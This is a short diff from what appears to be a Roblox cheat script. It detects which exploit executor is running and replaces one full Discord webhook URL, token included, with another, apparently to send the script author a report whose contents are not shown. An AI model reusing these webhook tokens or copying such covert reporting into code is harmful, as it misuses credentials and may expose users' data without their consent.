@@ -49,7 +49,7 @@ local webhookcheck = (syn and not is_sirhurt_closure and not pebc_execute and "S
   or (identifyexecutor():find("ScriptWare") and "Script-Ware")
   or ("Shitty Exploit")
 
-local url = "https://discord.com/api/webhooks/1122771951451111444/OVaZe5y0qRa0UXUi4jHFlP5foTvovkEypCyGBmRbxfrgCmDiT1zE8vGXQLXlc1qrt9Ru"
+local url = "https://discord.com/api/webhooks/1137232174261739560/_bKkSw9KqaII4a_uDrFKa4NTUOlkKKCboegM8u71VJzXoMWGpSa-ZbY5YeRGNJ8Utp8y"
 
 local data = {
     ["avatar_url"] = "https://i.imgur.com/oBPXx0D.png",
